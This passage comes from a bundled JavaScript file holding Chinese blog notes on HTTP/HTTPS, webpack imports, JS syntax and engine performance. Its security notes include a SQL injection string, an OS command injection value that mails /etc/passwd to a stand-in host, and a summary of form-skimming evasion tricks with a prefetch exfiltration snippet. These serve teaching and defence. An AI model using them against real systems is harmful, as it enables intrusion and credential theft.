（双方都具有加密解密能力）</li>\\n</ul>\\n</li>\\n<li>不验证通信方的身份，因此有可能遭遇伪装<ul>\\n<li>任何人都可发起请求</li>\\n<li>HTTPS可以确认对方的证书</li>\\n</ul>\\n</li>\\n<li>无法证明报文的完整性，所以有可能已遭篡改<ul>\\n<li>接收到的内容可能有误（中间人攻击）</li>\\n</ul>\\n</li>\\n</ul>\\n<hr>\\n<p>SSL采用<code>公钥</code>和<code>私钥</code></p>\\n<p>HTTPS 采用混合加密机制(SSL+HTTP)</p>\\n<p>机制前提：公开密钥加密与共享密钥加密相比，其处理速度要慢</p>\\n<ol>\\n<li>在交换密钥（共享密钥）环节使用公开密钥加密方式</li>\\n<li>之后的建立通信交换报文阶段则使用共享密钥加密方式</li>\\n</ol>\\n<hr>\\n<p>在使用公钥加密之前，如何确保接收到的公钥是正确的</p>\\n<ol>\\n<li>公钥放置在公钥证书（数字证书）内部。</li>\\n<li>浏览器内置了常用第三方认证的公开密钥（用于对数字证书进行校验）。</li>\\n</ol>\\n<hr>\\n<p>可证明组织真实性的 EV SSL 证书</p>\\n<hr>\\n<p>客户端证书</p>\\n<p>需要费用，用于特殊用途的业务，例如网银。</p>\\n<hr>\\n<p>HTTPS 的安全通信机制</p>\\n<ol>\\n<li><p>客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包含客户端支持的 SSL 的指定版本、\\n加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。</p>\\n<p> 总结：(协商加密组件，验证SSL版本)</p>\\n</li>\\n<li><p>服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，\\n在报文中包含 SSL 版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。</p>\\n<p> 总结：回应SSL版本，确认加密组件</p>\\n</li>\\n<li><p>之后服务器发送 Certificate 报文。报文中包含公开密钥证书。</p>\\n<p> 总结：发生公钥证书（包含公钥）</p>\\n</li>\\n<li><p>最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束。</p>\\n</li>\\n<li><p>SSL 第一次握手结束之后，客户端以 Client Key Exchange 报文作为回应。\\n报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。\\n该报文已用步骤 3 中的公开密钥进行加密。</p>\\n<p> 总结：对共享密钥使用公钥加密并且发送</p>\\n</li>\\n<li><p>接着客户端继续发送 Change Cipher Spec 报文。该报文会提示服务器，\\n在此报文之后的通信会采用 Pre-master secret 密钥加密。</p>\\n<p> 总结：提示准备进行共享密钥加密（速度快）</p>\\n</li>\\n<li><p>客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。\\n这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。</p>\\n<p> 总结：最后一次总验证</p>\\n</li>\\n<li><p>服务器同样发送 Change Cipher Spec 报文。</p>\\n</li>\\n<li><p>服务器同样发送 Finished 报文。</p>\\n<p> 总结：确认使用共享密钥加密，三次握手结束</p>\\n</li>\\n<li><p>服务器和客户端的 Finished 报文交换完毕之后，SSL 连接就算建立完成。\\n当然，通信会受到 SSL 的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。</p>\\n</li>\\n<li><p>应用层协议通信，即发送 HTTP 响应。</p>\\n<p>总结：后续直接HTTP协议通信（使用共享密钥）</p>\\n</li>\\n<li><p>最后由客户端断开连接。断开连接时，发送 close_notify 报文。</p>\\n</li>\\n</ol>\\n<hr>\\n<p>BASIC认证</p>\\n<p>明文发送账号密码，非常不安全。</p>\\n<p>DIGEST认证</p>\\n<p>发送通过<code>质询码</code>计算生成的<code>响应码</code>验证。</p>\\n<p>SSL 客户端认证</p>\\n<p>通过客户端证书(内含公钥)进行SSL安全认证</p>\\n<ul>\\n<li><p>证书认证(例如验证网银证书，确认客户端)</p>\\n</li>\\n<li><p>基于表单认证(例如登录表单，输入网银密码，确认本人操作)</p>\\n<ul>\\n<li>基于<code>cookie</code>保存上一次验证信息，判断是否本人操作</li>\\n</ul>\\n</li>\\n</ul>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-26","timeArr":[2018,10,26,0,0,0,0],"title":"图解Http大纲笔记(2)","uuid":"6b947579be3958bc587abb5535d818129ff810da","summary":"<p>实体首部字段</p>\\n<ul>\\n<li>Content-Encoding：实体编码方式(gzip, compress, deflate, identity)</li>\\n<li>Content-Location：报文主体返回资源对应的 URI(不一定是请求URI)。</li>\\n<li>Content-Range：匹配部分。</li>\\n<li>Content-Type：实体内对象的媒...</li>\\n</ul>","slug":"tu-jie-Http-da-gang-bi-ji-(2)","sha":"ad5b165bf43fc96f65189cf43aad4253aafc6b16"}')},648:function(n){n.exports=JSON.parse('{"content":"<p>HTTP的瓶颈</p>\\n<ul>\\n<li>一条连接上只可发送一个请求。</li>\\n<li>请求只能从客户端开始。客户端不可以接收除响应以外的指令。</li>\\n<li>请求 / 响应首部未经压缩就发送。首部信息越多延迟越大。</li>\\n<li>发送冗长的首部。每次互相发送相同的首部造成的浪费较多。</li>\\n<li>可任意选择数据压缩格式。非强制压缩发送。</li>\\n</ul>\\n<p>解决方法：</p>\\n<ol>\\n<li>Ajax (局部更新)</li>\\n<li>Comet (延迟响应，请求了挂起，等有更新再响应)</li>\\n</ol>\\n<hr>\\n<p>WebSocket</p>\\n<ul>\\n<li><p>推送功能：服务器推送给客户端</p>\\n</li>\\n<li><p>减少通信量</p>\\n<ol>\\n<li>保持连接状态</li>\\n<li>握手请求：<ul>\\n<li>请求头字段<code>Upgrade: websocket</code></li>\\n<li>请求头字段<code>Sec-WebSocket-Key</code>：握手过程中必不可少的键值</li>\\n</ul>\\n</li>\\n<li>握手响应：<ul>\\n<li>响应状态码<code>101 Switching Protocols</code></li>\\n<li>响应字段<code>Sec-WebSocket-Accept</code>：根据<code>Sec-WebSocket-Key</code>生成</li>\\n</ul>\\n</li>\\n</ol>\\n</li>\\n</ul>\\n<hr>\\n<p>Web 服务器管理文件的 WebDAV</p>\\n<p>是一个可对 Web 服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统</p>\\n<p>一些概念</p>\\n<ul>\\n<li>集合（Collection）：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。</li>\\n<li>资源（Resource）：把文件或集合称为资源。</li>\\n<li>属性（Property）：定义资源的属性。定义以“名称 = 值”的格式执行。</li>\\n<li>锁（Lock）：把文件设置成无法编辑状态。多人同时编辑时，可防止在同一时间进行内容写入。</li>\\n</ul>\\n<hr>\\n<p>WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法</p>\\n<ul>\\n<li>PROPFIND ：获取属性</li>\\n<li>PROPPATCH ：修改属性</li>\\n<li>MKCOL ：创建集合</li>\\n<li>COPY ：复制资源及属性</li>\\n<li>MOVE ：移动资源</li>\\n<li>LOCK ：资源加锁</li>\\n<li>UNLOCK ：资源解锁</li>\\n</ul>\\n<p>为配合扩展的方法，状态码也随之扩展。</p>\\n<ul>\\n<li>102 Processing ：可正常处理请求，但目前是处理中状态</li>\\n<li>207 Multi-Status ：存在多种状态</li>\\n<li>422 Unprocessible Entity ：格式正确，内容有误</li>\\n<li>423 Locked ：资源已被加锁</li>\\n<li>424 Failed Dependency ：处理与某请求关联的请求失败，因此不再维持依赖关系</li>\\n<li>507 Insufficient Storage ：保存空间不足</li>\\n</ul>\\n<hr>\\n<ul>\\n<li><p>XSS攻击</p>\\n</li>\\n<li><p>SQL注入攻击</p>\\n<p>   例子：</p>\\n<p>   URL 的查询字段已指定 <code>xxx.com/?q= 上野宣</code>，这个值由 Web 应用传入到SQL 语句中，构成下方的 SQL 语句。</p>\\n<p>   <code>SELECT * FROM bookTbl WHERE author = &#39;上野宣&#39; and flag = 1;</code></p>\\n<p>   注入：</p>\\n<p>   查询字段的<code>上野宣</code>改写成<code>上野宣&#39;--</code>，执行以下SQL(<code>--</code>表示之后是注释)</p>\\n<p>   <code>SELECT * FROM bookTbl WHERE author =&#39;上野宣&#39; --&#39; and flag=1;</code></p>\\n<ul>\\n<li><p>OS 注入攻击</p>\\n<p>一段咨询表单代码，会获取用户填写的邮箱，自动发送一封邮件。</p>\\n<pre><code><pre class=\\"hljs\\"><code>my $adr = $q-&gt;param(\'mailaddress\');\\nopen(MAIL, &quot;| /usr/sbin/sendmail $adr&quot;);\\nprint MAIL &quot;From: info@example.com\\\\n&quot;;</code></pre></code></pre><p>攻击者将下面的值指定作为邮件地址</p>\\n<p><code>; cat /etc/passwd | mail hack@example.jp</code></p>\\n<p>攻击者的输入值中含有分号<code>;</code>。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>HTTP 首部注入攻击</p>\\n<p>  有些响应会将请求的一部分作为响应首部字段值。</p>\\n<p>  HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行<code>%0D%0A</code>，添加任意响应首部或主体的一种攻击</p>\\n<p>  HTTP 首部注入攻击有可能会造成以下一些影响。</p>\\n<ul>\\n<li>设置任何 Cookie 信息</li>\\n<li>重定向至任意 URL</li>\\n<li>显示任意的主体（HTTP 响应截断攻击）</li>\\n</ul>\\n</li>\\n<li><p>HTTP 响应截断攻击</p>\\n<p>  插入2个换行<code>%0D%0A%0D%0A</code>，伪造成响应主体。</p>\\n</li>\\n<li><p>开放重定向</p>\\n<p>  重定向参数写在<code>URL</code>上，容易被篡改</p>\\n<p>  <code>http://example.com/?redirect=http://hackr.jp</code></p>\\n</li>\\n<li><p>会话劫持( 盗取<code>sid</code>)</p>\\n<ul>\\n<li>通过非正规的生成方法推测会话 ID</li>\\n<li>通过窃听或 XSS 攻击盗取会话 ID</li>\\n<li>通过会话固定攻击（Session Fixation）强行获取会话 ID</li>\\n</ul>\\n</li>\\n<li><p>跨站点请求伪造(CSRF)</p>\\n<p>  可能造成的危害：</p>\\n<ul>\\n<li><p>利用已通过认证的用户权限更新设定信息等</p>\\n</li>\\n<li><p>利用已通过认证的用户权限购买商品</p>\\n</li>\\n<li><p>利用已通过认证的用户权限在留言板上发表言论</p>\\n<p>例子：</p>\\n<p>留言板评论<code>&lt;img src=&quot;恶意代码&quot; /&gt;</code></p>\\n<p>其他用户访问，执行恶意代码，被获取<code>cookie</code></p>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n<hr>\\n<p>通过网络进行密码试错</p>\\n<ul>\\n<li><p>穷举法</p>\\n</li>\\n<li><p>字典攻击</p>\\n</li>\\n<li><p>彩虹表</p>\\n<p>  <code>Rainbow Table</code>是由明文密码及与之对应的散列值构成的一张数据库表</p>\\n</li>\\n<li><p>点击劫持(UI伪装)</p>\\n</li>\\n<li><p>DoS 攻击</p>\\n<p>  主要有以下两种 DoS 攻击方式。</p>\\n<ul>\\n<li><p>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。</p>\\n</li>\\n<li><p>通过攻击安全漏洞使服务停止。</p>\\n<p>多台计算机发起的 DoS 攻击称为 DDoS 攻击</p>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-29","timeArr":[2018,10,29,0,0,0,0],"title":"图解Http大纲笔记(3)","uuid":"b0662d8a00fca2a154662ad07955d8c807636c91","summary":"<p>HTTP的瓶颈</p>\\n<ul>\\n<li>一条连接上只可发送一个请求。</li>\\n<li>请求只能从客户端开始。客户端不可以接收除响应以外的指令。</li>\\n<li>请求 / 响应首部未经压缩就发送。首部信息越多延迟越大。</li>\\n<li>发送冗长的首部。每次互相发送相同的首部造成的浪费较多。</li>\\n<li>可任意选择数据压缩格式。非强制压缩发送。</li>\\n</ul>\\n<p>解决方法：</p>\\n<ol>\\n<li>Ajax (局部...</li>\\n</ol>","slug":"tu-jie-Http-da-gang-bi-ji-(3)","sha":"fe5b6414904c9b660ed09bb3304c04df11fe2d88"}')},649:function(n){n.exports=JSON.parse('{"content":"<p>调用<code>import()</code>执行动态加载时，如果使用变量模板进行请求，会潜在的请求当前确定的路径下的<strong>所有文件</strong>！</p>\\n<p>例如：</p>\\n<p>现在有如下文件结构：</p>\\n<pre><code><pre class=\\"hljs\\"><code>|---asset\\n  |---blog\\n    |---tech\\n      |---001.json\\n      |---002.json\\n      |---003.json\\n      ...\\n    |---essay\\n      |---001.json\\n      |---002.json\\n      |---003.json\\n      ...\\n  |---img\\n    |---a.png\\n    |---b.png</code></pre></code></pre><p>现在想<code>import</code>文件夹<code>tech</code>内部的所有文章，如果里面有100篇，可以考虑<code>lazy-once</code>，这样只需要1个请求而不是100个，接着设计了一个请求模块，接受一个路径参数<code>fetchPath</code></p>\\n<pre><code><pre class=\\"hljs\\"><code>// fetchPath: \'asset/blog/tech\'\\n// datas包含tech每一个文件的title\\ndatas.forEach((data)=&gt;{\\n  let filename=data.title+&quot;.json&quot;\\n  import(\\n    /* webpackMode: &quot;lazy-once&quot; */\\n    `/${fetchPath}/${filename}`\\n  )\\n  .then(...)\\n})</code></pre></code></pre><p>上面这一段，原本的意思可能就是希望在<code>tech</code>文件夹内部获取每一个文件的具体内容。</p>\\n<p>但这么写，实际上请求会将<code>/</code>目录以内的<strong>所有格式的文件</strong>都进行请求，包括<code>img</code>内部的<code>*.png</code>，\\n再去比对你所需要的<code>${filename}</code>，这是因为如果你的请求中包含变量模板(变量)，\\n<code>webpack</code>会潜在的请求已经确定的路径中的内容，例如这里已经确定的就是<code>/</code></p>\\n<p>如果请求路径这么写： <code>/${fetchPath}/${data.title}.json</code>，则<code>webpack</code>能确定的是<code>/</code>和后缀<code>.json</code>，因此会去请求<code>/</code>路径下所有后缀为<code>.json</code>的文件。</p>\\n<p>官方给出的解决方案是使用<code>webpackInclude</code>和<code>webpackExclude</code>，但这两个选项在这里改变的意义不大，这里的变量包括路径名，\\n而<code>webpackInclude</code>和<code>webpackExclude</code>是不会匹配前缀(路径)的。</p>\\n<p>因此个人的解决方案就是给<code>webpack</code>一个能确定的目录，在这个目录之中去请求。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// fetchPath: \'asset/blog/tech\'</span>\\n<span class=\\"hljs-comment\\">// datas包含tech每一个文件的title</span>\\ndatas.forEach(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">data</span>)=&gt;</span>{\\n  <span class=\\"hljs-keyword\\">if</span>(fetchPath.includes(<span class=\\"hljs-string\\">\'tech\'</span>) ){\\n     <span class=\\"hljs-keyword\\">import</span>(\\n       <span class=\\"hljs-comment\\">/* webpackMode: \\"lazy-once\\" */</span>\\n       <span class=\\"hljs-string\\">`/asset/blog/tech/<span class=\\"hljs-subst\\">${data.title}</span>.json`</span>\\n     )\\n     .then(...) \\n  }<span class=\\"hljs-keyword\\">else</span>{\\n    ...\\n  }\\n})</code></pre></code></pre>\\n<p>当已经确定是在<code>tech</code>内部，就可以让<code>import</code>放心的去请求需要的文件。</p>\\n<p>另一个解决方案是使用<code>lazy</code>而不是<code>lazy-once</code>，但是如果存在100个文件，则需要请求100次，而且<code>100次请求</code>总大小也比请求<code>1次请求包含100项</code>内容大很多（包含重复请求头和响应头）。</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-12-22","timeArr":[2018,11,22,0,0,0,0],"title":"webpack动态import的一个坑","uuid":"eef7e96833e36dd1982a065c2bf4658180ae9581","summary":"<p>调用<code> import()</code>执行动态加载时，如果使用变量模板进行请求，会潜在的请求当前确定的路径下的<strong>所有文件</strong>！</p>\\n<p>例如：</p>\\n<p>现在有如下文件结构：</p>\\n<pre class=\\"hljs\\"><code>|---asset\\n  |---blog\\n    |---tech\\n      |---001.json\\n      |---002.json\\n      |-...</code></pre>","slug":"webpack-dong-tai-import-de-yi-ge-keng","sha":"4edeb6d395d6a622ada753d259d16102786a87f9"}')},650:function(n){n.exports=JSON.parse('{"content":"<blockquote>\\n<p>ES</p>\\n</blockquote>\\n<h4 id=\\"bian-hua-1\\">变化1</h4>\\n<p>原写法：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> data = {\\n  <span class=\\"hljs-attr\\">user</span>: {},\\n};\\n<span class=\\"hljs-keyword\\">const</span> street = data &amp;&amp; data.user &amp;&amp; data.user.address &amp;&amp; data.user.address.street;\\n<span class=\\"hljs-built_in\\">console</span>.log(data.user.address.street); <span class=\\"hljs-comment\\">// undefined</span></code></pre></code></pre>\\n<p>新写法：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> data = {\\n  <span class=\\"hljs-attr\\">user</span>: {},\\n};\\n<span class=\\"hljs-built_in\\">console</span>.log(data.user?.address?.street); <span class=\\"hljs-comment\\">// undefined</span></code></pre></code></pre>\\n<p>遇到数组：</p>\\n<p><code>data?.user?.address?.neighbors?.[number]</code></p>\\n<p>遇到函数：</p>\\n<p><code>data?.user?.someFunction?.()</code></p>\\n<h4 id=\\"bian-hua-2\\">变化2</h4>\\n<p>原写法：</p>\\n<p><code>value != null ? value : &#39;default value&#39;;</code></p>\\n<p>新写法：</p>\\n<p><code>value ?? &#39;default value&#39;;</code></p>\\n<h4 id=\\"bian-hua-3\\">变化3</h4>\\n<p>原写法：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">doubleSay</span> (<span class=\\"hljs-params\\">str</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> str + <span class=\\"hljs-string\\">\\", \\"</span> + str;\\n}\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">capitalize</span> (<span class=\\"hljs-params\\">str</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> str[<span class=\\"hljs-number\\">0</span>].toUpperCase() + str.substring(<span class=\\"hljs-number\\">1</span>);\\n}\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">exclaim</span> (<span class=\\"hljs-params\\">str</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> str + <span class=\\"hljs-string\\">\'!\'</span>;\\n}\\n<span class=\\"hljs-keyword\\">let</span> result = exclaim(capitalize(doubleSay(<span class=\\"hljs-string\\">\\"hello\\"</span>)));\\nresult <span class=\\"hljs-comment\\">//=&gt; \\"Hello, hello!\\"</span></code></pre></code></pre>\\n<p>新写法：</p>\\n<pre><code><pre class=\\"hljs\\"><code>let result = &quot;hello&quot;\\n  |&gt; doubleSay\\n  |&gt; capitalize\\n  |&gt; exclaim;\\n\\nresult //=&gt; &quot;Hello, hello!&quot;</code></pre></code></pre><p>另外：也可以用composes</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">compose</span>(<span class=\\"hljs-params\\">...funcs</span>) </span>{\\n  <span class=\\"hljs-keyword\\">if</span> (funcs.length === <span class=\\"hljs-number\\">0</span>) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">arg</span> =&gt;</span> arg\\n  }\\n  <span class=\\"hljs-keyword\\">if</span> (funcs.length === <span class=\\"hljs-number\\">1</span>) {\\n    <span class=\\"hljs-keyword\\">return</span> funcs[<span class=\\"hljs-number\\">0</span>]\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> funcs.reduce(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a, b</span>) =&gt;</span> <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...args</span>) =&gt;</span> a(b(...args)))\\n}\\n<span class=\\"hljs-keyword\\">let</span> result = compose(exclaim,capitalize,doubleSay)(<span class=\\"hljs-string\\">\\"hello\\"</span>);\\nresult <span class=\\"hljs-comment\\">//=&gt; \\"Hello, hello!\\"</span></code></pre></code></pre>\\n","toc":[{"anchor":"bian-hua-1","level":4,"text":"变化1"},{"anchor":"bian-hua-2","level":4,"text":"变化2"},{"anchor":"bian-hua-3","level":4,"text":"变化3"}],"relatedTags":null,"created_at":"2018-06-23","timeArr":[2018,5,23,0,0,0,0],"title":"未来JS新变化3个","uuid":"19eb833c0872c308711633143c73c05509c956cd","summary":"<blockquote>\\n<p>ES</p>\\n</blockquote>\\n<h4>变化1：</h4>\\n<p>原写法：</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> data = {\\n  <span class=\\"hljs-attr\\">user</span>: {},\\n};\\n<span class=\\"hljs-keyword\\">const</span> street = data &amp;&amp; data.user &amp;&amp; data.user.address &amp;&amp; data.user.address.street;\\n<span class=\\"hljs-built_in\\">console</span>.log(data.use...</code></pre>","slug":"wei-lai-JS-xin-bian-hua-3-ge","sha":"026909510ca57f701c4dfaa8c73e5cae0f6caab1"}')},651:function(n){n.exports=JSON.parse('{"content":"<blockquote>\\n<p>原文地址：<a href=\\"https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5\\">https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5</a></p>\\n</blockquote>\\n<p>作者讲述了一些能够达成的破解网络安全手段(有些已被认为是bug修复，例如2)，并给出建议</p>\\n<p>抓取form的字段，传送</p>\\n<ol>\\n<li>发布小功能npm，嵌入代码内</li>\\n<li>打开dev工具时，不发送</li>\\n<li>每次发射后，记录到cookie，不重复</li>\\n<li>检测到，设定发射概率，减少次数</li>\\n<li>fetch --&gt;gfudi 减少1位</li>\\n<li>xx.min.js和xx.js内容不同</li>\\n<li>通过prefetch和检测内容安全策略，避开<pre><code><pre class=\\"hljs\\"><code> const linkEl = document.createElement(\'link\');\\n linkEl.rel = \'prefetch\';\\n linkEl.href = urlWithYourPreciousData;\\n document.head.appendChild(linkEl);</code></pre></code></pre>建议：针对重要表单，完全重新写一个iframe（自己手写，无任何依赖）</li>\\n</ol>\\n","toc":[],"relatedTags":null,"created_at":"2018-07-30","timeArr":[2018,6,30,0,0,0,0],"title":"文章记录—当前的网页安全","uuid":"fe3678963ac1c863362da40651884c9820158971","summary":"<p>原文地址：https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5</p>","slug":"wen-zhang-ji-lu-dang-qian-de-wang-ye-an-quan","sha":"f41c15ad702abc0dee5cac1c2036c5a1cb10aaba"}')},652:function(n){n.exports=JSON.parse('{"content":"<p>原文：<a href=\\"https://medium.freecodecamp.org/javascript-essentials-why-you-should-know-how-the-engine-works-c2cc0d321553\\">https://medium.freecodecamp.org/javascript-essentials-why-you-should-know-how-the-engine-works-c2cc0d321553</a></p>\\n<hr>\\n<h4 id=\\"xian-xiang\\">现象</h4>\\n<p>文章首先就抛出了两段代码，它们的不同之处仅仅在于后者的数据结构多了一个属性而已</p>\\n<p>例一：</p>\\n<pre><code><pre class=\\"hljs\\"><code>(() =&gt; { \\n  const han = {firstname: &quot;Han&quot;, lastname: &quot;Solo&quot;};\\n  const luke = {firstname: &quot;Luke&quot;, lastname: &quot;Skywalker&quot;};\\n  const leia = {firstname: &quot;Leia&quot;, lastname: &quot;Organa&quot;};\\n  const obi = {firstname: &quot;Obi&quot;, lastname: &quot;Wan&quot;};\\n  const yoda = {firstname: &quot;&quot;, lastname: &quot;Yoda&quot;};\\n  const people = [\\n    han, luke, leia, obi, \\n    yoda, luke, leia, obi \\n  ];\\n  const getName = (person) =&gt; person.lastname;\\n  console.time(&quot;engine&quot;);\\n  for(var i = 0; i &lt; 1000 * 1000 * 1000; i++) { \\n    getName(people[i &amp; 7]); \\n  }\\n  console.timeEnd(&quot;engine&quot;); \\n})();</code></pre></code></pre><p>例二：</p>\\n<pre><code><pre class=\\"hljs\\"><code>(() =&gt; {\\n  const han = {firstname: &quot;Han&quot;, lastname: &quot;Solo&quot;, spacecraft: &quot;Falcon&quot;};\\n  const luke = {firstname: &quot;Luke&quot;, lastname: &quot;Skywalker&quot;, job: &quot;Jedi&quot;};\\n  const leia = {firstname: &quot;Leia&quot;, lastname: &quot;Organa&quot;, gender: &quot;female&quot;};\\n  const obi = {firstname: &quot;Obi&quot;, lastname: &quot;Wan&quot;, retired: true};\\n  const yoda = {lastname: &quot;Yoda&quot;};\\n  const people = [\\n    han, luke, leia, obi, \\n    yoda, luke, leia, obi\\n  ];\\n  const getName = (person) =&gt; person.lastname;\\n  console.time(&quot;engine&quot;);\\n  for(var i = 0; i &lt; 1000 * 1000 * 1000; i++) {\\n    getName(people[i &amp; 7]);\\n  }\\n  console.timeEnd(&quot;engine&quot;);\\n})();</code></pre></code></pre><p>结果执行后，第一个耗时约1.2s,第二个耗时约8.5s</p>\\n<p>仅仅加了一个属性，为什么会有这么大的差距？</p>\\n<hr>\\n<h4 id=\\"yuan-yin\\">原因</h4>\\n<p>这就要提到JS的<code>Interpreter</code>(解释器)和<code>Compiler</code>编译器。</p>\\n<p>当创建一个对象后，解释器会对这个对象进行检索，这个检索操作是消耗很大的。</p>\\n<p>因此，又要提出一个概念<code>Inline Caching</code>内联缓存，它会在运行时，将对象按照属性的key名称和顺序完全一致的分类，例如<code>{firstname: &quot;Han&quot;, lastname: &quot;Solo&quot;}</code>和<code>{lastname: &quot;Solo&quot;, firstname: &quot;Han&quot;}</code>会被分为2类。</p>\\n<p>如果对象都属于同一类，也就是它们的<code>shape</code>形状一致，那么内联缓存就会让编译器执行相同的处理，从而提升性能。</p>\\n<p>在第一个例子中，由于所有数据结构的&quot;形状&quot;都是一样的，因此称为<code>单态内联缓存</code>；</p>\\n<p>当&quot;形状&quot;超过1个，第二个例子，即缓存了多个数据结构的&quot;形状&quot;，那么编译器每次都会在几个&quot;形状之间&quot;进行判断；</p>\\n<p>当缓存的&quot;形状&quot;继续增加，超过一个上限值后，就不存在局部缓存，而是全局缓存，那么每次检索都会在全局缓存上查找，这会导致性能下降到极点。</p>\\n<hr>\\n<h4 id=\\"jie-jue\\">解决</h4>\\n<p>知道原因后，问题就很好解决了，定义一个&quot;形状&quot;一样的数据结构就好了</p>\\n<pre><code><pre class=\\"hljs\\"><code>(() =&gt; {\\n  class Person {\\n    constructor({\\n      firstname = \'\',\\n      lastname = \'\',\\n      spaceship = \'\',\\n      job = \'\',\\n      gender = \'\',\\n      retired = false\\n    } = {}) {\\n      Object.assign(this, {\\n        firstname,\\n        lastname,\\n        spaceship,\\n        job,\\n        gender,\\n        retired\\n      });\\n    }\\n  }\\n  const han = new Person({\\n    firstname: \'Han\',\\n    lastname: \'Solo\',\\n    spaceship: \'Falcon\'\\n  });\\n  const luke = new Person({\\n    firstname: \'Luke\',\\n    lastname: \'Skywalker\',\\n    job: \'Jedi\'\\n  });\\n  const leia = new Person({\\n    firstname: \'Leia\',\\n    lastname: \'Organa\',\\n    gender: \'female\'\\n  });\\n  const obi = new Person({\\n    firstname: \'Obi\',\\n    lastname: \'Wan\',\\n    retired: true\\n  });\\n  const yoda = new Person({ lastname: \'Yoda\' });\\n  const people = [\\n    han,\\n    luke,\\n    leia,\\n    obi,\\n    yoda,\\n    luke,\\n    leia,\\n    obi\\n  ];\\n  const getName = person =&gt; person.lastname;\\n  console.time(\'engine\');\\n  for (var i = 0; i &lt; 1000 * 1000 * 1000; i++) {\\n    getName(people[i &amp; 7]);\\n  }\\n  console.timeEnd(\'engine\');\\n})();</code></pre></code></pre><p>运行，消耗时间1.2s，任务完成！</p>\\n","toc":[{"anchor":"xian-xiang","level":4,"text":"现象"},{"anchor":"yuan-yin","level":4,"text":"原因"},{"anchor":"jie-jue","level":4,"text":"解决"}],"relatedTags":null,"created_at":"2018-09-08","timeArr":[2018,8,8,0,0,0,0],"title":"文章记录—为什么要知道js的引擎如何工作","uuid":"1ce699882ae4c19377061e00fa95e2bc41b3f185","summary":"<p>原文：[https://medium.freecodecamp.org/javascript-essentials-why-you-should-know-how-the-engine-works-c2cc0d321553](https://medium.freecodecamp.org/javascript-ess...</p>","slug":"wen-zhang-ji-lu-wei-shen-mo-yao-zhi-dao-js-de-yin-qing-ru-he-gong-zuo","sha":"f6d88502864f6fa2ddb9fd4f3a6d78cbd5bc29c5"}')},653:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"lu-jing-keng\\">路径坑</h4>\\n<ul>\\n<li>html图片路径：</li>\\n</ul>\\n<p>要利用<code>html-loader</code>的 <code>attr</code> 处理，只有<code>attr</code>覆盖到了，才会打包它。</p>\\n<p>例如<code>img</code>的<code>src</code>(img:src) 和<code>link</code>的<code>ref</code>(link:ref)，例如<code>favicon</code>，和一些用了<code>data-src</code>的，例如<code>lazyload</code></p>\\n<p>关于路径问题，可以修改<code>html</code>的路径使图片能找到，这样它就会被抓取并且打包</p>\\n<p>也可以对每一个定义一个子路径，就像我做的，<code>html</code>图片文件的路径是 <code>&lt;img src=&quot;/img/xxx.png&quot; 